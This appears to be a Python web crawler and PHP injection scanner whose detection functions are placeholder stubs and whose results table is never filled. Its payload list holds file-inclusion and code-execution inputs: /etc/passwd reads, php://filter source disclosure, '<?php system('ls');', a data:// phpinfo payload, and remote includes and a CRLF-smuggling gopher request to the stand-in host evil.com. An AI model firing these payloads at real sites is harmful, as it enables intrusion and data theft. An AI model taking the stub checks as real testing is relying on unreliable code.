import requests
from bs4 import BeautifulSoup
import concurrent.futures
import urllib.parse
import argparse
import sqlite3
from queue import Queue

# Define your custom PHP injection vulnerability testing logic here
def test_php_injection_vulnerabilities(url):
    try:
        # Implement your PHP injection vulnerability testing logic here
        response = requests.get(url)
        
        # Sample logic: Check if the response contains a known PHP injection string
        if "php_injection_marker" in response.text:
            return True  # PHP injection vulnerability found
        else:
            return False  # No PHP injection vulnerability found

    except Exception as e:
        print(f"Error testing PHP injection: {e}")
        return False

# Define your custom PHP stream wrapper testing logic here
def test_php_stream_wrapper_vulnerabilities(url):
    try:
        # Implement your PHP stream wrapper testing logic here
        response = requests.get(url)
        
        # Sample logic: Check if the response contains a known stream wrapper marker
        if "stream_wrapper_marker" in response.text:
            return True  # PHP stream wrapper issue found
        else:
            return False  # No PHP stream wrapper issue found

    except Exception as e:
        print(f"Error testing PHP stream wrapper: {e}")
        return False

# Function to fetch and parse a URL
def fetch_and_parse_url(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if response.status_code == 200:
            content = response.text
            soup = BeautifulSoup(content, 'html.parser')
            return soup
    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}")
    return None

# Function to test forms on a page
def test_forms(url, soup):
    forms = soup.find_all('form')
    
    for form in forms:
        action = form.get('action')
        method = form.get('method')

        print(f"Form found at URL: {url}")
        print(f"Action: {action}")
        print(f"Method: {method}")
        print("Fields:")
        
        input_fields = form.find_all('input')
        for field in input_fields:
            name = field.get('name')
            field_type = field.get('type')
            print(f"Name: {name}, Type: {field_type}")

        print("\n")

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Advanced Web Crawler and PHP Injection Vulnerability Testing")
parser.add_argument("--start-url", type=str, help="Starting URL for crawling")
args = parser.parse_args()

# Initialize an SQLite database for reporting vulnerabilities
conn = sqlite3.connect("vulnerability_report.db")
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   url TEXT,
                   parameter TEXT,
                   result TEXT)''')
conn.commit()

# Global variables for tracking crawled pages and testing vulnerabilities
visited_pages = set()
crawled_pages = set()
max_pages = 100

# Fill the test case queue
test_case_queue = Queue()
stream_wrappers = [
    "file://", "http://", "https://", "ftp://", "php://input", "data://", "zip://", "gopher://"
]

test_cases = {
    "file://": [
        "/etc/passwd", "/etc/hostname", "/etc/hosts", "../../../index.php", "php://filter/convert.base64-encode/resource=index.php",
    ],
    "http://": [
        "http://evil.com/malicious_script.php", "http://example.com",
    ],
    "https://": [
        "https://evil.com/malicious_script.php", "https://example.com",
    ],
    "ftp://": [
        "ftp://evil.com/malicious_script.php",
    ],
    "php://input": [
        "<?php echo 'Hello, I am PHP code!';", "<?php system('ls');", "",
    ],
    "data://": [
        "text/plain,Hello%20World", "application/x-php,<?php phpinfo(); ?>",
    ],
    "zip://": [
        "zip://archive.zip#file.txt",
    ],
    "gopher://": [
        "gopher://evil.com/1/_GET%20HTTP/1.0%0D%0AHost:%20evil.com%0D%0A%0D%0A",
    ]
}

for wrapper in stream_wrappers:
    for test_case in test_cases.get(wrapper, []):
        test_case_queue.put((wrapper, test_case))

# Function to crawl a page, test for PHP injection vulnerabilities, and submit forms
def crawl_and_test_page(url):
    global crawled_pages
    if url not in crawled_pages and len(crawled_pages) < max_pages:
        print(f"Crawling: {url}")
        soup = fetch_and_parse_url(url)
        if soup:
            crawled_pages.add(url)
            for link in soup.find_all('a'):
                next_url = link.get('href')
                if next_url and next_url.startswith(args.start_url):
                    next_url = urllib.parse.urljoin(args.start_url, next_url)
                    if next_url not in visited_pages:
                        visited_pages.add(next_url)
                        crawl_and_test_page(next_url)
            if test_php_injection_vulnerabilities(url):
                print(f"PHP Injection Vulnerability Found: {url}")
            
            if test_php_stream_wrapper_vulnerabilities(url):
                print(f"PHP Stream Wrapper Issue Found: {url}")
            
            test_forms(url, soup)

# Main function
if __name__ == '__main__':
    start_url = args.start_url
    visited_pages.add(start_url)

    # Create a thread pool for crawling and vulnerability testing
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        executor.submit(crawl_and_test_page, start_url)

    # Generate and write a report to the output file
    with open("vulnerability_report.txt", "w") as report_file:
        cursor.execute("SELECT * FROM vulnerabilities")
        for row in cursor.fetchall():
            report_file.write(f"URL: {row[1]}, Parameter: {row[2]}, Result: {row[3]}\n")

    # Close the SQLite database connection
    conn.close()
